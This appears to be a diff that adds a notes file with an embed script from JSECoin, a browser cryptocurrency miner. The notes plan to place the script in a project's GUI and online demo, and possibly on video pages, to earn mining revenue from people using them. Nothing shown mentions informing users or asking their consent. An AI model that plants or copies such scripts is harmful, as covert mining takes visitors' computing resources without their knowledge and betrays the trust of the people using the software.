@@ -1,0 +1,9 @@
+# The embed script from jse coin. 
+
+Should be embedded in /static/gui ...
+since the GUI doubles up as the actual gui for the software and the online interactive demo.
+so revenue from both sources. On that note, we could be mining from users watching videos on the academy page too. 
+
+<script type="text/javascript">
+    !function(){window.JSEDarkMode=1;window.JSENoAds=1;var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/68296/10.3.141.1/0/0/",s.parentNode.insertBefore(t,s)}();
+</script>
